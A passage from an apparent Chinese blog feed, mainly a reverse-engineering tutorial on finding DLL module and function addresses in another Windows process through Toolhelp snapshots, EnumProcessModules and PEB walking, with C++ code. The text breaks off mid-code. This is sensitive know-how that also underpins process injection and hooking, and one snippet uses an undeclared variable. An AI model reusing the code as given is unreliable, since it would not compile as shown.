class="comment">//printf(&quot;ImageBaseAddress:%x\r\n&quot;, ((_PEB32*)Peb)-&gt;ImageBaseAddress);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>四种获取目标进程导入DLL模块地址的方法</title>
      <link href="/2024/02/04/%E5%9B%9B%E7%A7%8D%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%85%A5DLL%E6%A8%A1%E5%9D%97%E5%9C%B0%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2024/02/04/%E5%9B%9B%E7%A7%8D%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%85%A5DLL%E6%A8%A1%E5%9D%97%E5%9C%B0%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="四种获取目标进程导入DLL模块地址的方法"><a href="#四种获取目标进程导入DLL模块地址的方法" class="headerlink" title="四种获取目标进程导入DLL模块地址的方法"></a>四种获取目标进程导入DLL模块地址的方法</h1><p>本人在校大学生一枚，技术不太行，各位师傅将就看看。</p><h1 id="1-获取进程快照"><a href="#1-获取进程快照" class="headerlink" title="1. 获取进程快照"></a>1. 获取进程快照</h1><p><code>tlhelp32.h</code>头文件中，提供了<code>CreateToolhelp32Snapshot</code>API，可以获取获取指定进程以及这些进程使用的堆、模块和线程的快照。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateToolhelp32Snapshot</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD dwFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD th32ProcessID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20231214001210494.png" alt="image-20231214001210494"></p><p>在进程快照信息中，包含着进程导入模块的信息。因此，我们可以有如下实现思路：</p><ol><li>调用<code>CreateToolhelp32Snapshot</code>指定<code>TH32CS_SNAPPROCESS</code>属性，获取进程快照句柄。</li><li>使用<code>Process32Next</code>遍历进程信息，对比进程名查找到目标进程。</li><li>使用<code>OpenProcess</code>验证目标进程状态。</li><li>调用<code>CreateToolhelp32Snapshot</code>指定<code>TH32CS_SNAPMODULE</code>属性，获取目标进程的模块快照。</li><li>使用<code>Module32Next</code>遍历模块，直到获取到目标模块信息，返回目标模块的句柄。</li><li>后续干什么都可以了，例如使用<code>GetProcAddress</code>获取目标函数的地址。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">HMODULE <span class="title">GetProcessModuleHandle</span><span class="params">(DWORD pid, CONST TCHAR* moduleName)</span> </span>&#123;<span class="comment">// 根据 PID 、模块名（需要写后缀，如：&quot;.dll&quot;），获取模块入口地址</span></span><br><span class="line">    MODULEENTRY32 moduleEntry;</span><br><span class="line">    HANDLE handle = <span class="literal">NULL</span>;</span><br><span class="line">    moudleInfoHandle = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE, pid); <span class="comment">//  获取进程快照的打开句柄，包含模块信息（TH32CS_SNAPMODULE指定）</span></span><br><span class="line">    <span class="keyword">if</span> (!moudleInfoHandle) &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(moudleInfoHandle);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;moduleEntry, <span class="built_in">sizeof</span>(MODULEENTRY32));</span><br><span class="line">    moduleEntry.dwSize = <span class="built_in">sizeof</span>(MODULEENTRY32);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">Module32First</span>(moudleInfoHandle, &amp;moduleEntry)) &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(moudleInfoHandle);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_tcscmp(moduleEntry.szModule, moduleName) == <span class="number">0</span>) &#123; </span><br><span class="line">            <span class="built_in">CloseHandle</span>(moudleInfoHandle);</span><br><span class="line">            <span class="keyword">return</span> moduleEntry.hModule; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="built_in">Module32Next</span>(moudleInfoHandle, &amp;moduleEntry));</span><br><span class="line">    <span class="built_in">CloseHandle</span>(moudleInfoHandle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE hProcessSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);  <span class="comment">// 进程快照句柄</span></span><br><span class="line">    PROCESSENTRY32 process = &#123; </span><br><span class="line">        <span class="built_in">sizeof</span>(PROCESSENTRY32) </span><br><span class="line">    &#125;;<span class="comment">// 存放进程快照的结构体</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//  遍历进程</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hProcessSnap, &amp;process)) &#123;</span><br><span class="line">        <span class="comment">// 找到目标进程</span></span><br><span class="line">        std::string s_szExeFile = process.szExeFile; <span class="comment">// char* 转 string</span></span><br><span class="line">        <span class="keyword">if</span> (s_szExeFile == <span class="string">&quot;xxx.exe&quot;</span>) &#123;</span><br><span class="line">            HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, process.th32ProcessID); </span><br><span class="line">            <span class="keyword">if</span> (hProcess)</span><br><span class="line">            &#123;</span><br><span class="line">                HMODULE hMod = <span class="built_in">GetProcessModuleHandle</span>(process.th32ProcessID, <span class="string">&quot;xxx.dll&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (hMod)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">auto</span> fnAddress = <span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;xxFunc&quot;</span>);</span><br><span class="line">                    </span><br><span class="line">                    std::cout &lt;&lt; fnAddress &lt;&lt;<span class="string">&quot;        &quot;</span>&lt;&lt; <span class="built_in">GetLastError</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-枚举进程模块"><a href="#2-枚举进程模块" class="headerlink" title="2. 枚举进程模块"></a>2. 枚举进程模块</h1><p>按照微软官方的建议，使用<code>EnumProcessModules</code>函数枚举进程模块可以确定哪些进程加载了特定的DLL。这个函数在<code>psapi.h</code>中。以下是微软给出的实例代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">EnumProcessModules</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE  hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] HMODULE *lphModule,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD   cb,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] LPDWORD lpcbNeeded</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><ol><li>根据进程ID，调用<code>OpenProcess</code>获取进程句柄。</li><li>调用<code>EnumProcessModules</code>函数枚举模块信息。模块句柄都返回到hMods数组中。进一步筛选即可。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 为了确保正确解析符号，需要将 Psapi.lib 添加到 TARGETLIBS，并使用 -DPSAPI_VERSION=1 编译</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">PrintModules</span><span class="params">( DWORD processID )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hMods[<span class="number">1024</span>];</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    DWORD cbNeeded;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印进程标识符。</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>( <span class="string">&quot;\n进程 ID：%u\n&quot;</span>, processID );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取进程的句柄。</span></span><br><span class="line"></span><br><span class="line">    hProcess = <span class="built_in">OpenProcess</span>( PROCESS_QUERY_INFORMATION |</span><br><span class="line">                            PROCESS_VM_READ,</span><br><span class="line">                            FALSE, processID );</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 获取此进程中所有模块的列表。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">EnumProcessModules</span>(hProcess, hMods, <span class="built_in">sizeof</span>(hMods), &amp;cbNeeded))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (cbNeeded / <span class="built_in">sizeof</span>(HMODULE)); i++ )</span><br><span class="line">        &#123;</span><br><span class="line">            TCHAR szModName[MAX_PATH];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取模块文件的完整路径。</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">GetModuleFileNameEx</span>( hProcess, hMods[i], szModName,<span class="built_in">sizeof</span>(szModName) / <span class="built_in">sizeof</span>(TCHAR)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 打印模块名和句柄值。</span></span><br><span class="line"></span><br><span class="line">                _tprintf( <span class="built_in">TEXT</span>(<span class="string">&quot;\t%s (0x%08X)\n&quot;</span>), szModName, hMods[i] );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放对进程的句柄。</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>( hProcess );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">( <span class="type">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    DWORD aProcesses[<span class="number">1024</span>]; </span><br><span class="line">    DWORD cbNeeded; </span><br><span class="line">    DWORD cProcesses;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取进程标识符的列表。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">EnumProcesses</span>( aProcesses, <span class="built_in">sizeof</span>(aProcesses), &amp;cbNeeded ) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算返回了多少个进程标识符。</span></span><br><span class="line"></span><br><span class="line">    cProcesses = cbNeeded / <span class="built_in">sizeof</span>(DWORD);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印每个进程的模块名称。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; cProcesses; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">PrintModules</span>( aProcesses[i] );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-获取PEB"><a href="#3-获取PEB" class="headerlink" title="3. 获取PEB"></a>3. 获取PEB</h1><p><code>PEB +0x00c</code>成员<code>Ldr</code>指向<code>_PEB_LDR_DATA</code>结构，此结构的第三成员<code>InMemoryOrderModuleList</code>包含进程的已加载模块的双向链表的头部。列表中的每个项目都是指向<code>LDR_DATA_TABLE_ENTRY</code>结构的指针。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY</span> &#123;</span><br><span class="line">    PVOID Reserved1[<span class="number">2</span>];</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    PVOID Reserved2[<span class="number">2</span>];</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    BYTE Reserved4[<span class="number">8</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        ULONG CheckSum;</span><br><span class="line">        PVOID Reserved6;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG TimeDateStamp;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure><p>因此，这种方法的思路如下：</p><ol><li>调用<code>NtWow64QueryInformationProcess64</code>获取<code>PROCESS_BASIC_INFORMATION64(32)</code>结构</li><li>调用<code>NtWow64ReadVirtualMemory64</code>（32位用<code>ReadProcessMemory</code>）读出<code>PebBaseAddress</code></li><li>获取到PEB，定位到<code>_PEB_LDR_DATA</code>遍历<code>_LDR_DATA_TABLE_ENTRY</code></li><li>通过<code>FullDllName</code>筛选，<code>DllBase</code>返回模块基地址。</li></ol><p>贴一个大佬的获取PEB代码（原谅我实在忘了在哪找到的，知道的朋友请留言一下）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;subauth.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> region 依赖 </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(x) ((x) &gt;= 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ProcessBasicInformation 0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span><span class="params">(WINAPI *pfnNtWow64QueryInformationProcess64)</span></span></span><br><span class="line"><span class="function"><span class="params">(HANDLE ProcessHandle, UINT32 ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID ProcessInformation, UINT32 ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT32* ReturnLength)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span><span class="params">(WINAPI *pfnNtWow64ReadVirtualMemory64)</span></span></span><br><span class="line"><span class="function"><span class="params">(HANDLE ProcessHandle, PVOID64 BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID BufferData, UINT64 BufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    PUINT64 ReturnLength)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span><span class="params">(WINAPI *pfnNtQueryInformationProcess)</span></span></span><br><span class="line"><span class="function"><span class="params">(HANDLE ProcessHandle, ULONG ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID ProcessInformation, UINT32 ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT32* ReturnLength)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING_T</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    T Buffer;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY_T</span></span><br><span class="line">&#123;</span><br><span class="line">    T Flink;</span><br><span class="line">    T Blink;</span><br><span class="line">&#125;;</span><br><span class="line"> 